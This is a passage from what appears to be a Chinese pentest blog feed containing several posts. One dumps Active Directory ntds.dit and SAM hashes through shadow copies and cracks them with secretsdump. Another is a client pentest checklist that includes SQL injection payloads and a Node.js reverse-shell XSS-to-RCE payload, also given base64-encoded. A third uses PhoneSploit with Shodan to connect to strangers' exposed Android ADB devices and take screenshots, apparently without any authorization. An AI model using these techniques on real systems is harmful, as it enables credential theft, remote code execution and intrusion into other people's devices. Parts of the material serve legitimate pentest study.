<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vssadmin create shadow /for=c:</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/11/11/2V4taj6NhQWf3zR.png" alt="Image-3.png"></p>
<p>将NTDS和system文件复制出来</p>
<p>我这里也将sam也一起复制出来，方便后续顺便对比一下sam中的hash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ntds.dit c:\ntds.dit</span><br><span class="line"></span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM c:\system.hiv</span><br><span class="line"></span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SAM c:\sam.hiv</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/11/11/QnSchHo8I6zvXtO.png" alt="Image-4.png"></p>
<p>可以看到C盘下已经有我复制出来的3个文件了</p>
<p><img src="https://i.loli.net/2019/11/11/XJdVEkwzNe1IpHm.png" alt="Image-5.png"></p>
<p>记得把快照删掉</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vssadmin delete shadows /for=c: /quiet</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/11/11/qDXi7K31pjtTbJo.png" alt="Image-6.png"></p>
<p>将3个文件复制到本地</p>
<p>然后从<a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket</a> 把项目下载下来，我们只需要其中的\impacket-master\examples\secretsdump.py文件，将其与其它3个文件放一起方便操作。</p>
<p><img src="https://i.loli.net/2019/11/11/osA6LOi7TdaqtjH.png" alt="Image-7.png"></p>
<p>然后终端打开到这个目录，然后输入以下命令解码</p>
<p>ps:如果出现：ImportError: No module named impacket报错，那就pip install impacket就好</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">py -2 secretsdump.py -system system.hiv -ntds ntds.dit local</span><br></pre></td></tr></table></figure>

<p>ps:我这里是本地装了多个python版本，所以是py -2。<br>等待一下之后会出现解出来的信息</p>
<p><img src="https://i.loli.net/2019/11/11/9levr2DEa4nOTGi.png" alt="Image-9.png"></p>
<p>我们把hash拿去cmd5解一下，解出来可以看到密码</p>
<p><img src="https://i.loli.net/2019/11/11/QyTLFfAg8l2a3t4.png" alt="Image-10-1.png"></p>
<p>我们再来试试解sam，将下面3个文件放一起，方便操作</p>
<p><img src="https://i.loli.net/2019/11/11/JtOpPBoRAsh2wZq.png" alt="Image-11.png"></p>
<p>输入以下命令，但是啥都没解出来，这里先占个坑，日后研究研究与dump lsass内存的方式获取本地密码有何不同。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsadump::sam /system:system.hiv /sam:sam.hiv</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/11/11/GQYr3fTLd7E4UgD.png" alt="image-1568973604412.png"></p>
]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>PC客户端（C-S架构）渗透测试CheckList</title>
    <url>/2019/09/17/PC%E5%AE%A2%E6%88%B7%E7%AB%AF%EF%BC%88C-S%E6%9E%B6%E6%9E%84%EF%BC%89%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CheckList/</url>
    <content><![CDATA[<p>分享一个PC客户端渗透测试的checklist，稍微看了一下，方法和思路比我自己做项目时要清晰很多。</p><a id="more"></a>
<p>我自己在做这类cs架构的客户端测试时，一般都是用Fiddler+Proxifer的方式进行代理抓包，代理弄好之后就当成web系统渗透测试。</p>
<p>而作者的项目里还包括了像逆向这种，一般来说，客户给的测试系统都不会加壳，至少我目前接触到的都未加壳。</p>
<p>项目地址：<a href="https://github.com/theLSA/CS-checklist" target="_blank" rel="noopener">https://github.com/theLSA/CS-checklist</a></p>
<hr>
<h1 id="CS-checklist"><a href="#CS-checklist" class="headerlink" title="CS-checklist"></a><strong>CS-checklist</strong></h1><br>

<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a><strong>目录</strong></h2><ul>
<li><a href="#cs-checklist"><strong>CS-checklist</strong></a><ul>
<li><a href="#0x00-前言"><strong>0x00 前言</strong></a></li>
<li><a href="#0x01-概述"><strong>0x01 概述</strong></a></li>
<li><a href="#0x02-开发语言"><strong>0x02 开发语言</strong></a></li>
<li><a href="#0x03-协议"><strong>0x03 协议</strong></a></li>
<li><a href="#0x04-数据库"><strong>0x04 数据库</strong></a></li>
<li><a href="#0x05-测试工具"><strong>0x05 测试工具</strong></a></li>
<li><a href="#0x06-代理设置"><strong>0x06 代理设置</strong></a></li>
<li><a href="#0x07-测试点"><strong>0x07 测试点</strong></a><ul>
<li><a href="#0-信息收集"><strong>0.</strong> <strong>信息收集</strong></a></li>
<li><a href="#1-逆向工程"><strong>1.</strong> <strong>逆向工程</strong></a></li>
<li><a href="#2-信息泄露"><strong>2.</strong> <strong>信息泄露</strong></a></li>
<li><a href="#3-传输流量"><strong>3.</strong> <strong>传输流量</strong></a></li>
<li><a href="#4-其他漏洞"><strong>4.</strong> <strong>其他漏洞</strong></a><ul>
<li><a href="#爆破"><strong>爆破</strong></a></li>
<li><a href="#用户名枚举"><strong>用户名枚举</strong></a></li>
<li><a href="#sql语句暴露"><strong>SQL语句暴露</strong></a></li>
<li><a href="#sql注入"><strong>SQL注入</strong></a></li>
<li><a href="#csv注入"><strong>CSV注入</strong></a></li>
<li><a href="#弱口令"><strong>弱口令</strong></a></li>
<li><a href="#xss"><strong>XSS</strong></a></li>
<li><a href="#命令执行"><strong>命令执行</strong></a></li>
<li><a href="#逻辑缺陷"><strong>逻辑缺陷</strong></a></li>
<li><a href="#密码明文传输"><strong>密码明文传输</strong></a></li>
<li><a href="#dll劫持"><strong>DLL劫持</strong></a></li>
<li><a href="#授权认证缺陷"><strong>授权认证缺陷</strong></a></li>
<li><a href="#越权"><strong>越权</strong></a></li>
<li><a href="#未授权"><strong>未授权</strong></a></li>
<li><a href="#溢出"><strong>溢出</strong></a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#0x08-相关技巧"><strong>0x08 相关技巧</strong></a></li>
<li><a href="#0x09-参考资料相关资源"><strong>0x09 参考资料&amp;&amp;相关资源</strong></a></li>
</ul>
</li>
</ul>
<br>

<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a><strong>0x00 前言</strong></h2><p>本项目主要针对pc客户端（cs架构）渗透测试，结合自身测试经验和网络资料形成checklist，如有任何问题，欢迎联系，期待大家贡献更多的技巧和案例。</p>
<br>

<h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a><strong>0x01 概述</strong></h2><p>PC客户端，有丰富功能的gui，c-s架构。</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs00.png" alt="cs00"></p>
<p>//图片源自:</p>
<p><a href="#article">https://resources.infosecinstitute.com/practical-thick-client-application-penetration-testing-using-damn-vulnerable-thick-client-app-part-1/#article</a></p>
<br>

<h2 id="0x02-开发语言"><a href="#0x02-开发语言" class="headerlink" title="0x02 开发语言"></a><strong>0x02 开发语言</strong></h2><p>C#(.NET)，JAVA，DELPHI，C，C++……</p>
<br> 

<h2 id="0x03-协议"><a href="#0x03-协议" class="headerlink" title="0x03 协议"></a><strong>0x03 协议</strong></h2><p>TCP、HTTP(S)，TDS……</p>
<br> 

<h2 id="0x04-数据库"><a href="#0x04-数据库" class="headerlink" title="0x04 数据库"></a><strong>0x04 数据库</strong></h2><p>oracle，mssql，db2……</p>
<br> 

<h2 id="0x05-测试工具"><a href="#0x05-测试工具" class="headerlink" title="0x05 测试工具"></a><strong>0x05 测试工具</strong></h2><p>//相关工具下载：<a href="https://github.com/theLSA/hack-cs-tools" target="_blank" rel="noopener">https://github.com/theLSA/hack-cs-tools</a></p>
<p>dvta： pc客户端靶场</p>
<p>ida pro： 静态分析工具</p>
<p>ollydbg：动态分析工具</p>
<p>CFF Explorer：PE文件分析</p>
<p>PEID：查壳工具</p>
<p>exeinfope/studype：pe文件分析</p>
<p>wireshark：观察流量</p>
<p>tcpview：观察tcp流量</p>
<p>echo Mirage：可拦截tcp流量</p>
<p>burpsuite：http(s)抓包</p>
<p>proxifier：全局代理流量</p>
<p>procmon：文件和注册表监控</p>
<p>regshot：注册表变化对比</p>
<p>process Hacker：进程分析</p>
<p>RegfromApp：注册表监控</p>
<p>WSExplorer：岁月联盟进程抓包工具</p>
<p>strings：查看程序的字符串</p>
<br> 

<p>.net[反]编译：</p>
<p>dotpeek</p>
<p>de4dot</p>
<p>dnspy</p>
<p>ilspy</p>
<p>sae</p>
<p>ildasm</p>
<p>ilasm</p>
<br> 

<p>Java反编译</p>
<p>jad</p>
<p>jd-gui</p>
<p>jadx</p>
<p>dex2jar</p>
<p>在线版：<br><br><a href>javare.cn</a></p>
<p><a href="http://www.javadecompilers.com" target="_blank" rel="noopener">www.javadecompilers.com</a></p>
<br>

<p>Reflexil：组装编辑器（可以作为ilspy插件）</p>
<p>Vcg：自动化代码审计工具</p>
<p>BinScope：二进制分析工具</p>
<br> 

<h2 id="0x06-代理设置"><a href="#0x06-代理设置" class="headerlink" title="0x06 代理设置"></a><strong>0x06 代理设置</strong></h2><p>大部分客户端没有代理配置功能，需要自行设置全局代理，如下两种方法：</p>
<p>1）IE-internet设置-连接-局域网设置。</p>
<p>2）proxifier-proxy server/proxification rules</p>
<p>//http的流量可以结合burpsuite方便测试（proxy server设置为burp代理地址）。</p>
<br> 

<h2 id="0x07-测试点"><a href="#0x07-测试点" class="headerlink" title="0x07 测试点"></a><strong>0x07 测试点</strong></h2><br> 

<h3 id="0-信息收集"><a href="#0-信息收集" class="headerlink" title="0. 信息收集"></a><strong>0.</strong> <strong>信息收集</strong></h3><p>编译信息，开发环境/语言，使用协议，数据库，ip，混淆/加密，是否加壳等。</p>
<br>

<p>案例0-CFF查看客户端信息（如编译环境）</p>
<p>dvta</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs01.png" alt="cs01"></p>
<p><br><br> </p>
<h3 id="1-逆向工程"><a href="#1-逆向工程" class="headerlink" title="1. 逆向工程"></a><strong>1.</strong> <strong>逆向工程</strong></h3><p>反编译，源代码泄露，硬编码key/password，加解密逻辑，角色判断逻辑（0-admin，1-normaluser），后门等。 </p>
<br>

<p>案例0-反编译获取加解密逻辑并编写解密工具</p>
<p>dvta</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs02.png" alt="cs02"></p>
<p>通过该逻辑和获取的信息</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs03.png" alt="cs03"></p>
<p><strong>Encrypted Text:</strong> CTsvjZ0jQghXYWbSRcPxpQ==</p>
<p><strong>AES KEY:</strong> J8gLXc454o5tW2HEF7HahcXPufj9v8k8</p>
<p><strong>IV:</strong> fq20T0gMnXa6g0l4</p>
<p>编写解密工具</p>
<p><code>using System;</code><br><code>using System.Collections.Generic;</code><br><code>using System.ComponentModel;</code><br><code>using System.Data;</code></p>
<p><code>using System.Drawing;</code></p>
<p><code>using System.Linq;</code></p>
<p><code>using System.Text;</code></p>
<p><code>using System.Threading.Tasks;</code></p>
<p><code>using System.Windows.Forms;</code></p>
<p><code>using System.Security.Cryptography;</code></p>
<p><code>namespace aesdecrypt</code></p>
<p><code>{</code></p>
<p>​    <code>public partial class aesdecrypt : Form</code></p>
<p>​    <code>{</code></p>
<p>​        <code>public aesdecrypt()</code></p>
<p>​        <code>{</code></p>
<p>​            <code>InitializeComponent();</code></p>
<p>​        <code>}</code></p>
<p>​        <code>private void decrypt(object sender, EventArgs e)</code></p>
<p>​        <code>{</code></p>
<p>​            <code>String key = “J8gLXc454o5tW2HEF7HahcXPufj9v8k8”;</code></p>
<p>​            <code>String IV = “fq20T0gMnXa6g0l4”;</code></p>
<p>​            <code>String encryptedtext = “CTsvjZ0jQghXYWbSRcPxpQ==”;</code></p>
<p>​            <code>byte[] encryptedBytes = Convert.FromBase64String(encryptedtext);</code></p>
<p>​            <code>AesCryptoServiceProvider aes = new AesCryptoServiceProvider();</code></p>
<p>​            <code>aes.BlockSize = 128;</code></p>
<p>​            <code>aes.KeySize = 256;</code></p>
<p>​            <code>aes.Key = System.Text.ASCIIEncoding.ASCII.GetBytes(key);</code></p>
<p>​            <code>aes.IV = System.Text.ASCIIEncoding.ASCII.GetBytes(IV);</code></p>
<p>​            <code>aes.Padding = PaddingMode.PKCS7;</code></p>
<p>​            <code>aes.Mode = CipherMode.CBC;</code></p>
<p>​            <code>ICryptoTransform crypto = aes.CreateDecryptor(aes.Key, aes.IV);</code></p>
<p>​            <code>byte[] decryptedbytes = crypto.TransformFinalBlock(encryptedBytes, 0, encryptedBytes.Length);</code></p>
<p>​            <code>String decryptedString = System.Text.ASCIIEncoding.ASCII.GetString(decryptedbytes);</code></p>
<p>​            <code>Console.WriteLine(“\n”);</code></p>
<p>​            <code>Console.WriteLine(“##########Decryptig Database password##########\n”);</code></p>
<p>​            <code>Console.WriteLine(“Decrypted Database password:” + decryptedString+”\n”);</code></p>
<p>​            <code>Console.WriteLine(“##########Done##########\n”);</code></p>
<p>​        <code>}</code></p>
<p>​    <code>}</code></p>
<p><code>}</code></p>
<p>//解密代码源自<a href="https://resources.infosecinstitute.com/damn-vulnerable-thick-client-app-part-5/#article" target="_blank" rel="noopener">https://resources.infosecinstitute.com/damn-vulnerable-thick-client-app-part-5/#article</a></p>
<br>

<p>案例1-反编译修改代码逻辑让普通用户以管理员登录</p>
<p>dvta</p>
<p>1-Isadmin</p>
<p>0-Normaluser</p>
<p>改1为0即可判断为admin</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs04.png" alt="cs04"></p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs05.png" alt="cs05"></p>
<p><br><br></p>
<h3 id="2-信息泄露"><a href="#2-信息泄露" class="headerlink" title="2. 信息泄露"></a><strong>2.</strong> <strong>信息泄露</strong></h3><p>明文敏感信息，敏感文件（如安装目录下的xxx.config）。</p>
<p>注册表：利用regshot比较客户端运行（如登录）前后注册表差别。 </p>
<p>开发调试日志泄露（如dvta.exe &gt;&gt; log.txt）</p>
<p>process hacker查看客户端内存中的明文敏感数据（如账号密码/key）。</p>
<p>strings直接查看客户端字符串（如ip信息）。</p>
<p>查看源代码（如github,gitee等）</p>
<br>

<p>案例0-配置敏感信息泄露</p>
<p>dvta</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs06.png" alt="cs06"></p>
<br>

<p>案例1-内存泄露数据库账号密码</p>
<p>dvta</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs07.png" alt="cs07"></p>
<br>

<p>案例2-源代码含有硬编码ftp账号密码</p>
<p>dvta</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs08.png" alt="cs08"></p>
<br> 

<p>案例3-开发调试日志泄露</p>
<p>dvta</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs09.png" alt="cs09"></p>
<br>

<p>案例4-某系统登录后本地保存账号密码</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs10.png" alt="cs10"></p>
<p>//本案例来源于<a href="https://blog.csdn.net/weixin_30685047/article/details/95916065" target="_blank" rel="noopener">https://blog.csdn.net/weixin_30685047/article/details/95916065</a></p>
<p><br><br> </p>
<h3 id="3-传输流量"><a href="#3-传输流量" class="headerlink" title="3. 传输流量"></a><strong>3.</strong> <strong>传输流量</strong></h3><p>wireshark/echo Mirage/burpsuite+nopeproxy/fillder/charles</p>
<p>ftp等协议明文传输的账号密码</p>
<p>SQL语句明文传输（如利用构造注入，越权等）</p>
<br>

<p>案例0-正方教务系统sql语句明文传输，返回明文数据</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs11.png" alt="cs11"></p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs12.png" alt="cs12"></p>
<p>//本案例来源于wooyun</p>
<p><br><br></p>
<h3 id="4-其他漏洞"><a href="#4-其他漏洞" class="headerlink" title="4. 其他漏洞"></a><strong>4.</strong> <strong>其他漏洞</strong></h3><h4 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a><strong>爆破</strong></h4><p>如登录功能。</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs23.png" alt="cs23"></p>
<br> 

<h4 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a><strong>用户名枚举</strong></h4><p>案例0</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs13.png" alt="cs13"></p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs14.png" alt="cs14"></p>
<br>

<h4 id="SQL语句暴露"><a href="#SQL语句暴露" class="headerlink" title="SQL语句暴露"></a><strong>SQL语句暴露</strong></h4><p>案例0</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs15.png" alt="cs15"></p>
<br>

<h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><strong>SQL注入</strong></h4><p>如登录处，万能密码</p>
<p>xxx’ or ‘x’=’x</p>
<p>xxx’ or 1=1–</p>
<p>输入框处，构造闭合报错，如’、’)、%’)、order by 100–等。</p>
<p>利用显示位或报错注出数据，原理同web注入，不同数据库大同小异。</p>
<br> 

<p>案例0-oracle注入</p>
<p>‘ union select null,null,(select user from dual),null,null,(select banner from sys.v_$version where     rownum=1),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null from dual–</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs16.png" alt="cs16"></p>
<br>

<p>案例1-mssql注入</p>
<p>111’) and (select user)&gt;0–</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs17.png" alt="cs17"></p>
<br>

<h4 id="CSV注入"><a href="#CSV注入" class="headerlink" title="CSV注入"></a><strong>CSV注入</strong></h4><p>如导出excel，输入1+1，导出后看是否为2。</p>
<br> 

<h4 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a><strong>弱口令</strong></h4><p>可尝试admin 123456等。</p>
<br>

<h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a><strong>XSS</strong></h4><p>如Electron，NodeWebKit等。</p>
<br> 

<p>案例0-中国蚁剑xss到rce</p>
<p>环境：win7+phpstudy(php5.6.27-nts)+perl+nc+antsword2.0.5</p>
<p>xss webshell：</p>
<p><code>&lt;?php</code></p>
<p><code>header(&#39;HTTP/1.1 500 &lt;img src=# onerror=alertx&gt;&#39;);</code></p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs18.png" alt="cs18"></p>
<p>Win+node.js:</p>
<p>成功</p>
<p><code>var net = require(&quot;net&quot;), sh = require(&quot;child_process&quot;).exec(&quot;cmd.exe&quot;);</code></p>
<p><code>var client = new net.Socket();</code></p>
<p><code>client.connect(6677, &quot;127.0.0.1&quot;, function(){client.pipe(sh.stdin);sh.stdout.pipe(client);</code></p>
<p><code>sh.stderr.pipe(client);});</code></p>
<p><code>&lt;?php</code></p>
<p><code>header(&quot;HTTP/1.1 500 Not &lt;img src=# onerror=&#39;eval(new Buffer(</code>dmFyIG5ldCA9IHJlcXVpcmUoIm5ldCIpLCBzaCA9IHJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKS5leGVjKCJjbWQuZXhlIik7CnZhciBjbGllbnQgPSBuZXcgbmV0LlNvY2tldCgpOwpjbGllbnQuY29ubmVjdCg2Njc3LCAiMTI3LjAuMC4xIiwgZnVuY3Rpb24oKXtjbGllbnQucGlwZShzaC5zdGRpbik7c2guc3Rkb3V0LnBpcGUoY2xpZW50KTsKc2guc3RkZXJyLnBpcGUoY2xpZW50KTt9KTs=<code>,</code>base64<code>).toString())&#39;&gt;&quot;);</code></p>
<p><code>?&gt;</code></p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs19.png" alt="cs19"></p>
<p>相关参考</p>
<p><a href="https://www.anquanke.com/post/id/176379" target="_blank" rel="noopener">https://www.anquanke.com/post/id/176379</a></p>
<br> 

<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a><strong>命令执行</strong></h4><br>
案例0-印象笔记windows客户端6.15本地文件读取和远程命令执行 

<p><a href="http://blog.knownsec.com/2018/11/印象笔记-windows-客户端-6-15-本地文件读取和远程命令执行/" target="_blank" rel="noopener">http://blog.knownsec.com/2018/11/%E5%8D%B0%E8%B1%A1%E7%AC%94%E8%AE%B0-windows-%E5%AE%A2%E6%88%B7%E7%AB%AF-6-15-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8C%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</a></p>
<br> 

<p>案例1-某云pc客户端命令执行挖掘过程 </p>
<p><a href="https://www.secpulse.com/archives/53852.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/53852.html</a></p>
<br> 

<p>案例2-金山WPS Mail邮件客户端远程命令执行漏洞(Mozilla系XUL程序利用技巧) </p>
<p><a href="https://shuimugan.com/bug/view?bug_no=193117" target="_blank" rel="noopener">https://shuimugan.com/bug/view?bug_no=193117</a></p>
<br> 

<h4 id="逻辑缺陷"><a href="#逻辑缺陷" class="headerlink" title="逻辑缺陷"></a><strong>逻辑缺陷</strong></h4><p>测试点同web。</p>
<br>  

<h4 id="密码明文传输"><a href="#密码明文传输" class="headerlink" title="密码明文传输"></a><strong>密码明文传输</strong></h4><br> 

<h4 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a><strong>DLL劫持</strong></h4><p>Linux文件搜索顺序：</p>
<ol>
<li><p>当前目录</p>
</li>
<li><p>PATH顺序值目录</p>
</li>
</ol>
<br>

<p>程序搜索Dll顺序：</p>
<p>//没提供绝对路径</p>
<p>1.应用程序加载的目录。</p>
<p>2.当前目录。</p>
<p>3.系统目录 (C:\Windows\System32\)。</p>
<p>4.16位的系统目录。</p>
<p>5.Windows目录。</p>
<p>6.PATH变量的目录。</p>
<p>程序可以加载攻击者放置的恶意dll。</p>
<p>利用procmon搜索程序加载的dll，观察name not found。</p>
<p>msf生成恶意dll放置于程序加载位置，运行程序即可触发payload。</p>
<br> 

<p>案例0-dll劫持</p>
<p>dvta</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs20.png" alt="cs20"></p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs21.png" alt="cs21"></p>
<br>

<h4 id="授权认证缺陷"><a href="#授权认证缺陷" class="headerlink" title="授权认证缺陷"></a><strong>授权认证缺陷</strong></h4><p>注册表键值，授权服务器返回信息构造。</p>
<p>相关参考</p>
<p><a href="https://cloud.tencent.com/developer/article/1430899" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1430899</a></p>
<br> 

<h4 id="越权"><a href="#越权" class="headerlink" title="越权"></a><strong>越权</strong></h4><br> 

<h4 id="未授权"><a href="#未授权" class="headerlink" title="未授权"></a><strong>未授权</strong></h4><br> 

<p>案例0-正方教务系统数据库任意操作</p>
<p>知道ip即可接管数据库</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs22.png" alt="cs22"></p>
<p>//本案例来源于wooyun</p>
<br>

<h4 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a><strong>溢出</strong></h4><p><br><br></p>
<h2 id="0x08-相关技巧"><a href="#0x08-相关技巧" class="headerlink" title="0x08 相关技巧"></a><strong>0x08 相关技巧</strong></h2><p>1.wireshark直接过滤出服务器或数据库的ip或协议方便查看，如</p>
<p>ip.addr == 1.2.3.4&amp;&amp;http</p>
<p>2.如果有数据库账号，可以用数据库监控sql语句操作（如sql server profiler）。</p>
<p><br><br> </p>
<h2 id="0x09-参考资料-amp-amp-相关资源"><a href="#0x09-参考资料-amp-amp-相关资源" class="headerlink" title="0x09 参考资料&amp;&amp;相关资源"></a><strong>0x09 参考资料&amp;&amp;相关资源</strong></h2><p><a href="https://resources.infosecinstitute.com/" target="_blank" rel="noopener">https://resources.infosecinstitute.com</a></p>
]]></content>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>入侵全球安卓智能设备–PhoneSploit</title>
    <url>/2019/09/17/%E5%85%A5%E4%BE%B5%E5%85%A8%E7%90%83%E5%AE%89%E5%8D%93%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87%E2%80%93PhoneSploit/</url>
    <content><![CDATA[<p>刚在某论坛上看到了一篇文章引起了我的兴趣。<br><img src="https://i.loli.net/2019/11/11/DweyxtgKnPOkIhp.png" alt="Image-10.png"></p><a id="more"></a>
<p>稍微看了看，讲的是使用PhoneSploit+shodan通过adb调试开放在公网上的安卓设备。<br>所以，我自己实验了一下。<br>首先跟进github上的项目。地址：<a href="https://github.com/metachar/PhoneSploit" target="_blank" rel="noopener">https://github.com/metachar/PhoneSploit</a><br>作者非常的用心，整个安装加用法都安排的明明白白的，甚至是连shodan的语法都写了。瞬间Star加Fork。</p>
<hr>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>readme中写清楚了在windows和linux下怎么安装了，我这里是使用的kali，所以下文是直接在kali中的演示过程。<br><img src="https://i.loli.net/2019/11/11/72TAFaGrezBMdpQ.png" alt="Image-12.png"></p>
<p>按照作者的说法，在kali下键入以下命令先安装PhoneSploit和其必要模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/Zucccs/PhoneSploit</span><br><span class="line">cd PhoneSploit</span><br><span class="line">pip install colorama</span><br></pre></td></tr></table></figure>

<p>安装好之后还不能使用，还需要安装adb和fastboot<br>键入以下命令更新+安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install android-tools-adb android-tools-fastboot</span><br></pre></td></tr></table></figure>
<p>完了之后就开始使用吧！<br>进入PhoneSploit的目录，键入以下命令启动程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python main_linux.py</span><br></pre></td></tr></table></figure>
<p>ps：使用python2版本！<br>进入之后会有一个提示安装adb via命令行，输入Y即可<br>然后正式进入界面！<br><img src="https://i.loli.net/2019/11/11/rFE2kV5DOIYs3qm.png" alt="Image-14.png"></p>
<p>提示输入一个IP地址，这里我们就需要使用shodan啦！会看项目readme中可以看到作者给出了搜索语法，直接打开即可（shodan需要登录），这里我也顺便贴出来语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android debug bridge product:”Android Debug Bridge”</span><br></pre></td></tr></table></figure>

<p>也可以直接打开这个链接，都是一样的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://www.shodan.io/search?query=android+debug+bridge+product%3A%E2%80%9DAndroid+Debug+Bridge%E2%80%9D</span><br></pre></td></tr></table></figure>
<p>可以看到下图中搜索处全球1W+设备<br><img src="https://i.loli.net/2019/11/11/giUKh82MVWevRnl.png" alt="Image-15.png"></p>
<p>我们随便找一个试试<br>输入完IP之后，可以看到连接上了，之后我们只要输入菜单中对应的功能即可。<br>比如我这里输入：7。然后输入要保存的文件名：100.png，看一下对方的屏幕截图。</p>
<p><img src="https://i.loli.net/2019/11/11/V4OczG5nxuZflyP.png" alt="Image-18.png"></p>
<p>然后在程序目录下可以看到生成的图片。<br><img src="https://i.loli.net/2019/11/11/i8VDmRoYAlEnuWx.png" alt="Image-19.png"></p>
<hr>
<p>值得注意的是，PhoneSploit的菜单功能非常强大。除了菜单7可以截屏之外，还有6录制，3同时连接其他设备，4获取shell，以及安装、卸载、运行app，13导出设备信息，还能16端口转发、22开关wifi、23移除密码。作者真贴心！简直让小白无门槛了</p>
<p><img src="https://i.loli.net/2019/11/11/kJQbGoLCaKUYRuj.png" alt="Image-21.png"><br><img src="https://i.loli.net/2019/11/11/gFXyZ2lzfTUECOL.png" alt="Image-20.png"></p>
<h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>1、其实这些设备大部分都是连接公网IP的智能电视类设备，不一定是手机，所以我在文中也并未提及手机二字。</p>
<p>2、一些厂商在制作该类产品的时候，一开始就是默认开启adb调试的，因为他们全国乃至全球销售智能电视机，但并不能出了问题就到人家里去修，所以他们为了方便自己工作，就默认开了。但是这样做非常的不安全，就如上文实验的一样。但是手机不一样，只要你自己没瞎搞，没有root的手机是不会开启adb调试的。</p>
<p>3、上面shodan搜出来的1w+用户，怕是要遭罪了</p>
]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>各大厂商设备默认密码</title>
    <url>/2019/09/15/%E5%90%84%E5%A4%A7%E5%8E%82%E5%95%86%E8%AE%BE%E5%A4%87%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81/</url>
